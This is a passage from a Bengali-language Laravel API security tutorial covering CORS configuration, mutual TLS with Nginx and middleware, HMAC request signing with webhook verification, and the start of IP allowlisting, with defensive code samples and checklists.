    expect(Post::first()->title)->not->toContain('<script>');
});

it('ignores non-fillable fields', function () {
    $user = User::factory()->create();

    $this->actingAs($user)->postJson('/api/posts', [
        'title'   => 'Test',
        'body'    => 'Body',
        'status'  => 'draft',
        'user_id' => 999,          // অন্য কারো নামে post তৈরির চেষ্টা
    ])->assertCreated();

    expect(Post::first()->user_id)->toBe($user->id);
});
```

#### ✅ Input Sanitization Checklist

- [ ] প্রতিটা endpoint এ `FormRequest` আছে
- [ ] `$request->validated()` ব্যবহার হচ্ছে, `all()` নয়
- [ ] সব Model এ `$fillable` আছে, `$guarded = []` নেই
- [ ] Enum/status field এ `Rule::in([...])` whitelist আছে
- [ ] Sort/filter এ column name whitelist করা
- [ ] কোনো raw SQL এ string concatenation নেই
- [ ] File upload এ `mimes`, `max`, generated filename আছে
- [ ] Rich text HTML Purifier দিয়ে পরিষ্কার হচ্ছে

---

## 6. CORS Policy

### What is CORS?

**CORS (Cross-Origin Resource Sharing)** হলো browser এর একটা নিরাপত্তা ব্যবস্থা যা নিয়ন্ত্রণ করে — **কোন website থেকে JavaScript দিয়ে আপনার API কল করা যাবে।**

#### 🏠 Origin কি?

```
https://app.myshop.com:443
└─┬──┘  └──────┬───────┘└┬┘
scheme      host       port

এই তিনটার যেকোনো একটা আলাদা হলেই ভিন্ন origin:
https://app.myshop.com   ≠   http://app.myshop.com    (scheme আলাদা)
https://app.myshop.com   ≠   https://api.myshop.com   (host আলাদা)
https://app.myshop.com   ≠   https://app.myshop.com:8080 (port আলাদা)
```

#### 🔄 Preflight Request কি?

"সাধারণ" নয় এমন request (PUT/DELETE, custom header, JSON content-type) পাঠানোর **আগে** browser নিজে থেকে একটা `OPTIONS` request পাঠায় অনুমতি চাইতে:

```http
OPTIONS /api/posts/5 HTTP/1.1
Origin: https://app.myshop.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: authorization, content-type

--- Server এর উত্তর ---

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.myshop.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Max-Age: 86400
```

Server অনুমতি দিলে তবেই browser আসল `DELETE` request পাঠায়।

#### ⚠️ CORS সম্পর্কে দুইটা গুরুত্বপূর্ণ সত্য

1. **CORS শুধু browser এ কাজ করে।** Postman, cURL, বা কোনো server-side script এ CORS এর কোনো প্রভাব নেই — তারা যেকোনো API কল করতে পারবে।
2. **তাই CORS কোনো authentication এর বিকল্প নয়।** CORS শুধু *অন্য website এর JavaScript* কে ঠেকায়। আপনার API কে তবুও `auth` middleware দিয়ে protect করতে হবে।

### Why do we need it?

- 🛡️ **Malicious site থেকে রক্ষা** — `evil.com` এর JavaScript যাতে আপনার logged-in user এর হয়ে API কল করতে না পারে
- 🍪 **Credentialed request নিয়ন্ত্রণ** — cookie সহ request শুধু বিশ্বস্ত origin থেকেই আসবে
- 🔓 **Data leak প্রতিরোধ** — অন্য site আপনার API এর response পড়তে পারবে না
- ✅ **নিজের frontend কে কাজ করতে দেওয়া** — `app.myshop.com` থেকে `api.myshop.com` কল করা সম্ভব হবে

### Laravel Best Practice

Laravel 9+ এ CORS built-in — `Illuminate\Http\Middleware\HandleCors` middleware already global middleware stack এ আছে। শুধু config ঠিক করতে হবে।

#### ধাপ ১: Config Publish

```bash
php artisan config:publish cors
# পুরোনো Laravel এ: php artisan vendor:publish --tag=cors
```

#### ধাপ ২: `config/cors.php`

```php
<?php
// config/cors.php

return [
    // কোন path গুলোতে CORS প্রযোজ্য
    'paths' => ['api/*', 'sanctum/csrf-cookie', 'login', 'logout'],

    // কোন HTTP method allow করা হবে
    'allowed_methods' => ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],

    // ✅ নির্দিষ্ট origin - env থেকে পড়া হচ্ছে
    'allowed_origins' => array_filter(
        explode(',', (string) env('CORS_ALLOWED_ORIGINS', ''))
    ),

    // Subdomain pattern দরকার হলে (সাবধানে ব্যবহার করুন)
    'allowed_origins_patterns' => [
        // '#^https://[a-z0-9-]+\.myshop\.com$#',
    ],

    // ✅ শুধু যেগুলো সত্যিই দরকার
    'allowed_headers' => [
        'Accept',
        'Authorization',
        'Content-Type',
        'X-Requested-With',
        'X-API-Key',
        'X-Signature',
        'X-Timestamp',
    ],

    // Browser এর JavaScript যে response header গুলো পড়তে পারবে
    'exposed_headers' => [
        'X-RateLimit-Limit',
        'X-RateLimit-Remaining',
        'Retry-After',
    ],

    // Preflight উত্তর কতক্ষণ cache হবে (সেকেন্ড) - performance বাড়ায়
    'max_age' => 86400,

    // Cookie/session ভিত্তিক auth (Sanctum SPA) হলে true
    'supports_credentials' => (bool) env('CORS_SUPPORTS_CREDENTIALS', false),
];
```

```env
# .env (Production)
CORS_ALLOWED_ORIGINS=https://app.myshop.com,https://admin.myshop.com
CORS_SUPPORTS_CREDENTIALS=true
```

```env
# .env (Local development)
CORS_ALLOWED_ORIGINS=http://localhost:3000,http://localhost:5173
CORS_SUPPORTS_CREDENTIALS=true
```

#### 🚨 সবচেয়ে বিপজ্জনক ভুল

```php
// ❌❌❌ কখনো এই দুটো একসাথে দেবেন না
'allowed_origins'      => ['*'],
'supports_credentials' => true,
```

এর মানে দাঁড়ায় — **পৃথিবীর যেকোনো website আপনার user এর cookie সহ আপনার API কল করতে পারবে।** এটা CSRF এর দরজা খুলে দেওয়া।

ভাগ্য ভালো যে বেশিরভাগ browser এই combination reject করে, কিন্তু নির্ভর করবেন না।

| Config | নিরাপদ? | কখন |
|--------|---------|-----|
| `'allowed_origins' => ['*']`, credentials `false` | ⚠️ ঠিক আছে | সম্পূর্ণ public read-only API |
| নির্দিষ্ট origin list, credentials `true` | ✅ সবচেয়ে ভালো | SPA + Sanctum |
| `['*']` + credentials `true` | ❌❌ কখনো না | — |

#### ধাপ ৩: Sanctum SPA Authentication এর জন্য

Cookie-based SPA auth ব্যবহার করলে CORS এর পাশাপাশি এগুলোও লাগবে:

```env
# .env
APP_URL=https://api.myshop.com
SESSION_DOMAIN=.myshop.com                          # শুরুতে ডট — subdomain গুলো share করবে
SANCTUM_STATEFUL_DOMAINS=app.myshop.com,admin.myshop.com
CORS_SUPPORTS_CREDENTIALS=true
SESSION_SECURE_COOKIE=true                          # শুধু HTTPS এ cookie যাবে
SESSION_SAME_SITE=lax
```

```javascript
// Frontend (axios)
axios.defaults.withCredentials = true;
axios.defaults.baseURL = 'https://api.myshop.com';

// প্রথমে CSRF cookie নিতে হবে
await axios.get('/sanctum/csrf-cookie');
await axios.post('/login', { email, password });
```

> 💡 **Token-based auth (Bearer token) ব্যবহার করলে** `supports_credentials` লাগবে না — `false` রাখুন, কারণ token `Authorization` header এ যায়, cookie তে নয়। এটাই বেশি নিরাপদ।

#### 🐞 CORS Debugging

| Error Message | কারণ | সমাধান |
|---------------|------|--------|
| `No 'Access-Control-Allow-Origin' header` | Origin `allowed_origins` এ নেই | `.env` এ origin যোগ করুন (শেষে `/` দেবেন না) |
| `Method DELETE is not allowed` | `allowed_methods` এ নেই | Method যোগ করুন |
| `Request header X-API-Key is not allowed` | `allowed_headers` এ নেই | Header যোগ করুন |
| `credentials mode 'include'` error | `supports_credentials` false | `true` করুন এবং origin `*` নয় |
| Config বদলেছি কিন্তু কাজ করছে না | Config cached | `php artisan config:clear` |

```bash
# Terminal থেকে preflight test করুন
curl -I -X OPTIONS https://api.myshop.com/api/posts \
  -H "Origin: https://app.myshop.com" \
  -H "Access-Control-Request-Method: POST"
```

#### ✅ CORS Checklist

- [ ] Production এ `allowed_origins` এ নির্দিষ্ট domain আছে, `*` নেই
- [ ] `*` এবং `supports_credentials: true` একসাথে নেই
- [ ] `allowed_headers` এ শুধু প্রয়োজনীয় header
- [ ] Origin এ trailing slash নেই (`https://app.com/` ❌)
- [ ] Local ও Production এর জন্য আলাদা `.env` value
- [ ] CORS কে authentication এর বিকল্প ভাবছেন না

---

## 7. mTLS (Mutual TLS)

### What is mTLS?

সাধারণ **HTTPS/TLS** এ শুধু **একপক্ষ** যাচাই হয় — client দেখে server আসল কিনা (browser এর তালা 🔒 আইকন)। কিন্তু server জানে না client কে।

**mTLS (Mutual TLS)** এ **দুইপক্ষই** certificate দিয়ে একে অপরকে যাচাই করে।

```
সাধারণ TLS:
  Client ──── "তোমার certificate দেখাও" ────► Server
  Client ◄─── Server Certificate ───────────  Server
  ✅ Client নিশ্চিত হলো server আসল

mTLS:
  Client ──── "তোমার certificate দেখাও" ────► Server
  Client ◄─── Server Certificate ───────────  Server
  Client ◄─── "তোমারটাও দেখাও" ─────────────  Server
  Client ──── Client Certificate ───────────► Server
  ✅ দুইপক্ষই একে অপরকে চিনলো
```

#### 🛂 Analogy — ইমিগ্রেশন কাউন্টার

সাধারণ TLS = আপনি দেখলেন এটা আসল ব্যাংক (সাইনবোর্ড, লোগো)।
mTLS = ব্যাংকও আপনার **পাসপোর্ট** দেখে নিশ্চিত হলো আপনি কে।

দুইজনই দুইজনের পরিচয়পত্র দেখাচ্ছে — এটাই **Mutual**।

### Why do we need it?

- 🔐 **Strongest Authentication** — API key চুরি করা যায়, certificate + private key চুরি করা অনেক কঠিন
- 🕵️ **Man-in-the-Middle প্রতিরোধ** — মাঝখানে কেউ বসলে তার কাছে valid client certificate থাকবে না
- 🏦 **Compliance** — Banking, payment (PCI-DSS), healthcare এ প্রায়ই বাধ্যতামূলক
- 🏢 **Zero Trust Network** — internal microservice গুলোও একে অপরকে verify করে
- 🚫 **Credential Replay বন্ধ** — Certificate নির্দিষ্ট private key ছাড়া ব্যবহার করা যায় না

#### কখন mTLS দরকার, কখন না

| পরিস্থিতি | mTLS দরকার? |
|-----------|--------------|
| Public mobile app / browser SPA | ❌ না (certificate distribute করা অসম্ভব) |
| Payment gateway integration | ✅ হ্যাঁ |
| Bank / Insurance partner API | ✅ হ্যাঁ |
| Internal microservice (Kubernetes) | ✅ হ্যাঁ (service mesh দিয়ে) |
| সাধারণ SaaS API | ⚠️ সাধারণত না — API Key + Request Signing যথেষ্ট |

### Laravel Best Practice

#### 🔑 মূল ধারণা: TLS handshake PHP তে হয় না

Certificate যাচাইয়ের আসল কাজটা করে **Nginx / Apache / Load Balancer** — PHP পর্যন্ত request আসার আগেই। Laravel এর কাজ হলো —

1. Web server যে header পাঠায় সেটা পড়া
2. Certificate এর তথ্য (CN, fingerprint) দিয়ে client শনাক্ত করা
3. এই client এর permission আছে কিনা check করা

#### ধাপ ১: Certificate তৈরি (Development/Internal CA)

```bash
# 1) নিজের CA তৈরি (এটাই সব certificate এর "কর্তৃপক্ষ")
openssl genrsa -out ca.key 4096
openssl req -x509 -new -nodes -key ca.key -sha256 -days 3650 \
  -subj "/C=BD/O=MyShop/CN=MyShop Internal CA" -out ca.crt

# 2) Server certificate
openssl genrsa -out server.key 2048
openssl req -new -key server.key -subj "/CN=api.myshop.com" -out server.csr
openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial \
  -out server.crt -days 825 -sha256

# 3) Client certificate (প্রতিটা partner এর জন্য আলাদা)
openssl genrsa -out partner-xyz.key 2048
openssl req -new -key partner-xyz.key -subj "/CN=partner-xyz" -out partner-xyz.csr
openssl x509 -req -in partner-xyz.csr -CA ca.crt -CAkey ca.key -CAcreateserial \
  -out partner-xyz.crt -days 365 -sha256

# 4) Certificate এর SHA-256 fingerprint (Laravel এ এটাই মেলাবো)
openssl x509 -in partner-xyz.crt -noout -fingerprint -sha256
```

#### ধাপ ২: Nginx Configuration

```nginx
server {
    listen 443 ssl http2;
    server_name api.myshop.com;

    # ── Server side TLS ──────────────────────────
    ssl_certificate     /etc/nginx/ssl/server.crt;
    ssl_certificate_key /etc/nginx/ssl/server.key;
    ssl_protocols       TLSv1.2 TLSv1.3;

    # ── Client Certificate যাচাই (mTLS এর মূল অংশ) ──
    ssl_client_certificate /etc/nginx/ssl/ca.crt;   # কোন CA এর certificate গ্রহণ করা হবে
    ssl_verify_client      optional;                # 'on' = বাধ্যতামূলক, 'optional' = কিছু route এ
    ssl_verify_depth       2;

    # বাতিল হওয়া certificate এর তালিকা
    # ssl_crl /etc/nginx/ssl/crl.pem;

    location / {
        # ── PHP কে certificate এর তথ্য পাঠানো ──
        proxy_set_header X-SSL-Client-Verify  $ssl_client_verify;   # SUCCESS / FAILED / NONE
        proxy_set_header X-SSL-Client-DN      $ssl_client_s_dn;     # /CN=partner-xyz
        proxy_set_header X-SSL-Client-Serial  $ssl_client_serial;
        proxy_set_header X-SSL-Client-SHA1    $ssl_client_fingerprint;

        proxy_set_header Host              $host;
        proxy_set_header X-Real-IP         $remote_addr;
        proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;

        proxy_pass http://127.0.0.1:9000;
    }
}
```

> 🚨 **অত্যন্ত গুরুত্বপূর্ণ:** এই header গুলো **অবশ্যই** Nginx এ `proxy_set_header` দিয়ে **overwrite** করতে হবে। নাহলে attacker নিজেই `X-SSL-Client-Verify: SUCCESS` header পাঠিয়ে পুরো mTLS bypass করে ফেলবে। Nginx সবসময় client এর পাঠানো একই নামের header মুছে নিজেরটা বসাবে — এটাই নিশ্চিত করে যে header টা বিশ্বাসযোগ্য।

#### ধাপ ৩: Laravel Middleware

```php
<?php
// app/Http/Middleware/VerifyClientCertificate.php

namespace App\Http\Middleware;

use App\Models\ClientCertificate;
use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use Symfony\Component\HttpFoundation\Response;

class VerifyClientCertificate
{
    public function handle(Request $request, Closure $next): Response
    {
        // ধাপ ১: Nginx handshake সফল বলেছে কিনা
        if ($request->header('X-SSL-Client-Verify') !== 'SUCCESS') {
            Log::channel('security')->warning('mTLS handshake failed', [
                'verify' => $request->header('X-SSL-Client-Verify'),
                'ip'     => $request->ip(),
                'path'   => $request->path(),
            ]);

            return response()->json([
                'message' => 'A valid client certificate is required.',
            ], 403);
        }

        // ধাপ ২: DN থেকে Common Name বের করা
        $dn = (string) $request->header('X-SSL-Client-DN');   // "/C=BD/O=MyShop/CN=partner-xyz"

        if (! preg_match('#CN\s*=\s*([^,/]+)#i', $dn, $matches)) {
            return response()->json(['message' => 'Client certificate CN missing.'], 403);
        }

        $commonName = trim($matches[1]);

        // ধাপ ৩: আমাদের database এ এই certificate টা registered ও active কিনা
        $certificate = ClientCertificate::query()
            ->where('common_name', $commonName)
            ->where('serial', $request->header('X-SSL-Client-Serial'))
            ->active()
            ->first();

        if (! $certificate) {
            Log::channel('security')->warning('Unregistered or revoked client certificate', [
                'common_name' => $commonName,
                'ip'          => $request->ip(),
            ]);

            return response()->json([
                'message' => 'This client certificate is not authorized.',
            ], 403);
        }

        $certificate->forceFill(['last_used_at' => now()])->saveQuietly();

        $request->attributes->set('client_certificate', $certificate);

        return $next($request);
    }
}
```

```php
<?php
// app/Models/ClientCertificate.php

namespace App\Models;

use Illuminate\Database\Eloquent\Builder;
use Illuminate\Database\Eloquent\Model;

class ClientCertificate extends Model
{
    protected $fillable = [
        'partner_name', 'common_name', 'serial', 'fingerprint',
        'scopes', 'expires_at', 'revoked_at',
    ];

    protected $casts = [
        'scopes'       => 'array',
        'expires_at'   => 'datetime',
        'revoked_at'   => 'datetime',
        'last_used_at' => 'datetime',
    ];

    public function scopeActive(Builder $query): Builder
    {
        return $query
            ->whereNull('revoked_at')
            ->where(fn (Builder $q) => $q->whereNull('expires_at')->orWhere('expires_at', '>', now()));
    }
}
```

#### ধাপ ৪: Route এ ব্যবহার

```php
<?php
// routes/api.php

// Partner API - mTLS + API Key + Signature (তিন স্তর একসাথে)
Route::prefix('v1/secure')
    ->middleware(['mtls', 'api.key', 'signed.request', 'throttle:api-key'])
    ->group(function () {
        Route::post('/payments',  [PaymentController::class, 'store']);
        Route::post('/settlements', [SettlementController::class, 'store']);
    });
```

#### ধাপ ৫: Client Side — আপনি যখন mTLS API কল করবেন

```php
<?php
// config/services.php

'bank' => [
    'base_url'    => env('BANK_API_URL'),
    'cert_path'   => env('BANK_CLIENT_CERT'),     // storage/certs/client.crt
    'key_path'    => env('BANK_CLIENT_KEY'),      // storage/certs/client.key
    'key_password'=> env('BANK_CLIENT_KEY_PASSWORD'),
    'ca_path'     => env('BANK_CA_BUNDLE'),
],
```

```php
<?php
// app/Services/BankApiClient.php

namespace App\Services;

use Illuminate\Http\Client\PendingRequest;
use Illuminate\Support\Facades\Http;

class BankApiClient
{
    protected function client(): PendingRequest
    {
        return Http::baseUrl(config('services.bank.base_url'))
            ->withOptions([
                // Client certificate + private key
                'cert'   => [config('services.bank.cert_path'), config('services.bank.key_password')],
                'ssl_key'=> config('services.bank.key_path'),

                // ✅ Server certificate অবশ্যই verify করবেন - কখনো false করবেন না
                'verify' => config('services.bank.ca_path'),
            ])
            ->timeout(30)
            ->retry(2, 500);
    }

    public function createTransfer(array $payload): array
    {
        return $this->client()->post('/transfers', $payload)->throw()->json();
    }
}
```

> ❌ **`'verify' => false` কখনো লিখবেন না।** এটা লিখলে TLS এর পুরো নিরাপত্তা শেষ — যে কেউ মাঝখানে বসে সব data পড়তে ও বদলাতে পারবে। Local এ certificate error হলে সঠিক CA bundle path দিন, verify বন্ধ করবেন না।

#### 🗂️ Certificate Management

```bash
# মেয়াদ কবে শেষ দেখুন
openssl x509 -in partner-xyz.crt -noout -enddate

# Certificate এর তথ্য দেখুন
openssl x509 -in partner-xyz.crt -noout -text

# mTLS test করুন
curl -v https://api.myshop.com/api/v1/secure/payments \
  --cert partner-xyz.crt \
  --key partner-xyz.key \
  --cacert ca.crt
```

**Expiry monitoring — একটা scheduled command রাখুন:**

```php
<?php
// routes/console.php  (Laravel 11/12)

use App\Models\ClientCertificate;
use Illuminate\Support\Facades\Schedule;

Schedule::call(function () {
    ClientCertificate::active()
        ->whereBetween('expires_at', [now(), now()->addDays(30)])
        ->each(fn ($cert) => Log::channel('security')->alert(
            "Client certificate expiring soon: {$cert->common_name} ({$cert->expires_at->toDateString()})"
        ));
})->dailyAt('09:00');
```

> ⚠️ **Production এ mTLS ভাঙার #১ কারণ — certificate মেয়াদ শেষ হয়ে যাওয়া।** মেয়াদ শেষের ৩০ দিন আগে alert পাঠানোর ব্যবস্থা রাখুন।

#### ✅ mTLS Checklist

- [ ] Nginx এ `ssl_verify_client on` এবং `ssl_client_certificate` সেট আছে
- [ ] সব `X-SSL-*` header Nginx এ `proxy_set_header` দিয়ে overwrite হচ্ছে
- [ ] Laravel middleware `X-SSL-Client-Verify === 'SUCCESS'` চেক করছে
- [ ] Certificate database এ registered ও revocable
- [ ] Client side এ `'verify' => false` কোথাও নেই
- [ ] Private key `.gitignore` এ আছে এবং file permission `600`
- [ ] Expiry alert scheduled আছে

---

## 8. Request Signing

### What is Request Signing?

**Request Signing** মানে — request পাঠানোর সময় তার সাথে একটা **cryptographic signature** যোগ করা, যেটা প্রমাণ করে:

1. ✅ Request টা সত্যিই ওই client পাঠিয়েছে (**Authenticity**)
2. ✅ পথে কেউ data বদলায়নি (**Integrity**)
3. ✅ এটা পুরোনো request এর পুনরাবৃত্তি নয় (**Replay Protection**)

#### ✍️ Analogy — চিঠির সিলমোহর

রাজার চিঠিতে মোমের সিল থাকত। সিল ভাঙা থাকলে বোঝা যেত কেউ পড়েছে বা বদলেছে। Request Signing হলো ডিজিটাল সিলমোহর।

#### 🔐 কিভাবে কাজ করে

```
Client (secret জানে)                      Server (একই secret জানে)
      │                                          │
      │ 1. Canonical string বানায়:               │
      │    "POST\n/api/payments\n1735000000\n{...}"
      │                                          │
      │ 2. HMAC-SHA256(string, secret)           │
      │    = "a3f5c9..."                         │
      │                                          │
      │ 3. Header এ পাঠায় ──────────────────────►│
      │    X-Signature: a3f5c9...                │ 4. একই নিয়মে নিজে হিসাব করে
      │    X-Timestamp: 1735000000               │ 5. hash_equals() দিয়ে মেলায়
      │                                          │ 6. মিললে ✅ না মিললে ❌ 401
```

**গুরুত্বপূর্ণ:** secret কখনো network এ যায় না — শুধু signature যায়। তাই কেউ শুনে ফেললেও secret পাবে না।

### Why do we need it?

| সমস্যা | Signing ছাড়া | Signing থাকলে |
|--------|--------------|----------------|
| 🔄 **Tampering** | মাঝপথে `amount: 100` কে `amount: 100000` করে দেওয়া যায় | Signature মিলবে না → reject |
| ♻️ **Replay Attack** | একই "৳500 transfer" request ১০০ বার পাঠিয়ে ৳50,000 নেওয়া যায় | Timestamp + nonce দিয়ে বন্ধ |
| 🎭 **Forgery** | যে কেউ request বানাতে পারে | Secret ছাড়া signature বানানো অসম্ভব |
| 📮 **Fake Webhook** | যে কেউ "payment successful" webhook পাঠিয়ে ফ্রি জিনিস নিতে পারে | Signature verify করে আসল sender চেনা যায় |

> 💡 **API Key থাকলেও Request Signing কেন লাগবে?**
> API Key প্রতিবার একই — কেউ একবার পেয়ে গেলে যেকোনো request পাঠাতে পারবে। Signature প্রতিটা request এর **content এর উপর নির্ভর করে বদলায়** — তাই body এর একটা অক্ষর বদলালেই signature অকেজো হয়ে যায়।

### Laravel Best Practice

#### ধাপ ১: Signature Verification Middleware

```php
<?php
// app/Http/Middleware/VerifyRequestSignature.php

namespace App\Http\Middleware;

use App\Models\ApiKey;
use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Log;
use Symfony\Component\HttpFoundation\Response;

class VerifyRequestSignature
{
    /** Request কত সেকেন্ড পুরোনো হলে reject করা হবে */
    protected int $toleranceSeconds = 300;   // 5 minutes

    public function handle(Request $request, Closure $next): Response
    {
        $signature = $request->header('X-Signature');
        $timestamp = $request->header('X-Timestamp');
        $nonce     = $request->header('X-Nonce');
        $keyId     = $request->header('X-Key-Id');

        if (blank($signature) || blank($timestamp) || blank($nonce) || blank($keyId)) {
            return $this->deny('Missing signature headers.');
        }

        // ── ধাপ ১: Timestamp যাচাই (পুরোনো request বাতিল) ──
        if (! ctype_digit((string) $timestamp)
            || abs(time() - (int) $timestamp) > $this->toleranceSeconds) {
            return $this->deny('Request timestamp expired or invalid.');
        }

        // ── ধাপ ২: Nonce যাচাই (একই request দ্বিতীয়বার নয়) ──
        $nonceKey = "sig:nonce:{$keyId}:{$nonce}";

        if (! Cache::add($nonceKey, true, $this->toleranceSeconds * 2)) {
            Log::channel('security')->warning('Replay attack detected', [
                'key_id' => $keyId,
                'nonce'  => $nonce,
                'ip'     => $request->ip(),
            ]);

            return $this->deny('Duplicate request (replay detected).');
        }

        // ── ধাপ ৩: Secret বের করা ──
        $apiKey = ApiKey::query()->active()->where('prefix', $keyId)->first();

        if (! $apiKey || blank($apiKey->signing_secret)) {
            return $this->deny('Unknown signing key.');
        }

        // ── ধাপ ৪: নিজে signature হিসাব করা ──
        $expected = hash_hmac(
            'sha256',
            $this->canonicalString($request, $timestamp, $nonce),
            decrypt($apiKey->signing_secret)
        );

        // ── ধাপ ৫: Timing-safe comparison ──
        if (! hash_equals($expected, $signature)) {
            Log::channel('security')->warning('Invalid request signature', [
                'key_id' => $keyId,
                'ip'     => $request->ip(),
                'path'   => $request->path(),
            ]);

            return $this->deny('Invalid signature.');
        }

        $request->attributes->set('api_key', $apiKey);

        return $next($request);
    }

    /**
     * Canonical String — client ও server ঠিক একই নিয়মে বানাবে।
     * সামান্য পার্থক্য হলেও signature মিলবে না।
     */
    protected function canonicalString(Request $request, string $timestamp, string $nonce): string
    {
        return implode("\n", [
            strtoupper($request->method()),          // POST
            '/' . ltrim($request->path(), '/'),      // /api/v1/payments
            $timestamp,                              // 1735000000
            $nonce,                                  // uuid
            hash('sha256', $request->getContent()),  // body এর hash
        ]);
    }

    protected function deny(string $message): Response
    {
        return response()->json(['message' => $message], 401);
    }
}
```

#### ধাপ ২: Client Side — Signed Request পাঠানো

```php
<?php
// app/Services/SignedApiClient.php

namespace App\Services;

use Illuminate\Support\Facades\Http;
use Illuminate\Support\Str;

class SignedApiClient
{
    public function __construct(
        protected string $baseUrl,
        protected string $keyId,
        protected string $secret,
    ) {}

    public function post(string $path, array $payload): array
    {
        $body      = json_encode($payload, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
        $timestamp = (string) time();
        $nonce     = (string) Str::uuid();

        // server এর canonicalString() এর সাথে হুবহু একই নিয়ম
        $canonical = implode("\n", [
            'POST',
            '/' . ltrim($path, '/'),
            $timestamp,
            $nonce,
            hash('sha256', $body),
        ]);

        $signature = hash_hmac('sha256', $canonical, $this->secret);

        return Http::withBody($body, 'application/json')
            ->withHeaders([
                'X-Key-Id'    => $this->keyId,
                'X-Timestamp' => $timestamp,
                'X-Nonce'     => $nonce,
                'X-Signature' => $signature,
            ])
            ->post($this->baseUrl . $path)
            ->throw()
            ->json();
    }
}
```

#### ধাপ ৩: Incoming Webhook Verify করা (খুব সাধারণ কাজ)

Stripe, GitHub, বা যেকোনো payment gateway থেকে আসা webhook যাচাই করা:

```php
<?php
// app/Http/Middleware/VerifyWebhookSignature.php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use Symfony\Component\HttpFoundation\Response;

class VerifyWebhookSignature
{
    /**
     * Usage: ->middleware('webhook:stripe')
     */
    public function handle(Request $request, Closure $next, string $provider): Response
    {
        $secret = config("services.{$provider}.webhook_secret");

        if (blank($secret)) {
            Log::channel('security')->error("Webhook secret missing for [{$provider}]");

            return response()->json(['message' => 'Webhook not configured.'], 500);
        }

        // ⚠️ getContent() — raw body, কখনো $request->all() নয়!
        // JSON parse/re-encode করলে byte বদলে যায় এবং signature মিলবে না
        $payload   = $request->getContent();
        $timestamp = $request->header('X-Webhook-Timestamp');
        $received  = $request->header('X-Webhook-Signature');

        if (blank($received) || blank($timestamp)) {
            return response()->json(['message' => 'Missing webhook signature.'], 400);
        }

        if (abs(time() - (int) $timestamp) > 300) {
            return response()->json(['message' => 'Webhook timestamp too old.'], 400);
        }

        $expected = hash_hmac('sha256', $timestamp . '.' . $payload, $secret);

        if (! hash_equals($expected, $received)) {
            Log::channel('security')->warning('Webhook signature mismatch', [
                'provider' => $provider,
                'ip'       => $request->ip(),
            ]);

            return response()->json(['message' => 'Invalid webhook signature.'], 401);
        }

        return $next($request);
    }
}
```

```php
<?php
// routes/api.php

// Webhook route - CSRF ছাড়া, কিন্তু signature দিয়ে সুরক্ষিত
Route::post('/webhooks/stripe', [StripeWebhookController::class, 'handle'])
    ->middleware('webhook:stripe')
    ->name('webhooks.stripe');
```

#### 🚨 `hash_equals()` কেন `===` এর বদলে?

```php
// ❌ Timing attack এ দুর্বল
if ($expected === $received) { ... }

// ✅ Timing-safe
if (hash_equals($expected, $received)) { ... }
```

**কারণ:** PHP এর `===` প্রথম অমিল character পেলেই থেমে যায়। তাই `"aaaa"` এর তুলনায় `"abbb"` মেলাতে সামান্য বেশি সময় লাগে (nanosecond এর পার্থক্য)। Attacker লক্ষ লক্ষ request পাঠিয়ে এই সময়ের পার্থক্য মেপে একটা একটা করে signature এর character বের করে ফেলতে পারে।

`hash_equals()` সবসময় **একই সময় নেয়** — মিলুক বা না মিলুক। **সব secret comparison এ এটাই ব্যবহার করুন।**

#### 🧪 Test

```php
<?php
// tests/Feature/RequestSigningTest.php

it('rejects a tampered request body', function () {
    $secret    = 'test-secret';
    $body      = json_encode(['amount' => 100]);
    $timestamp = (string) time();
    $nonce     = (string) Str::uuid();

    $signature = hash_hmac('sha256', implode("\n", [
        'POST', '/api/v1/payments', $timestamp, $nonce, hash('sha256', $body),
    ]), $secret);

    // ⚠️ body বদলে দিলাম কিন্তু signature আগেরটাই
    $this->call('POST', '/api/v1/payments', [], [], [], [
        'HTTP_X_KEY_ID'    => 'sk_live_test',
        'HTTP_X_TIMESTAMP' => $timestamp,
        'HTTP_X_NONCE'     => $nonce,
        'HTTP_X_SIGNATURE' => $signature,
    ], json_encode(['amount' => 999999]))
        ->assertStatus(401);
});
```

#### ✅ Request Signing Checklist

- [ ] Signature এ **HTTP method, path, timestamp, nonce, body hash** — সবই আছে
- [ ] `hash_equals()` ব্যবহার হচ্ছে, `===` নয়
- [ ] Timestamp tolerance ৫ মিনিটের বেশি নয়
- [ ] Nonce cache এ রেখে replay বন্ধ করা হচ্ছে
- [ ] Webhook এ `$request->getContent()` (raw body) ব্যবহার হচ্ছে
- [ ] Signing secret encrypted অবস্থায় DB তে বা `.env` এ আছে
- [ ] Client ও Server এর canonical string algorithm হুবহু এক

---

## 9. IP Allowlisting

### What is IP Allowlisting?

**IP Allowlisting** (আগে Whitelisting বলা হতো) মানে — শুধু নির্দিষ্ট কিছু IP address বা IP range থেকেই API access দেওয়া, বাকি সবাইকে block করা।

```
✅ Allowlist (Default DENY)  → শুধু তালিকায় থাকা IP ঢুকতে পারবে   [বেশি নিরাপদ]
❌ Blocklist (Default ALLOW) → শুধু তালিকায় থাকা IP ঢুকতে পারবে না  [দুর্বল]
```

#### 🎟️ Analogy

Allowlist = **অতিথি তালিকার বিয়ে** — নাম না থাকলে ঢোকা যাবে না।
Blocklist = **খোলা মেলা** — শুধু চিহ্নিত ঝামেলাবাজদের ঠেকানো হয়, নতুন কেউ এলে বোঝার উপায় নেই।

**সবসময় Allowlist কে অগ্রাধিকার দিন** — কারণ attacker সহজেই নতুন IP ব্যবহার করতে পারে।

### Why do we need it?

- 🔒 **Attack Surface কমানো** — পুরো পৃথিবীর বদলে মাত্র ৫টা IP আপনার admin panel দেখতে পাবে
- 🏢 **Internal Endpoint সুরক্ষা** — cron, health check, deploy hook শুধু নিজেদের server থেকে
- 🤝 **Partner Integration** — partner এর server IP fixed, তাই তার key চুরি হলেও অন্য জায়গা থেকে কাজ করবে না
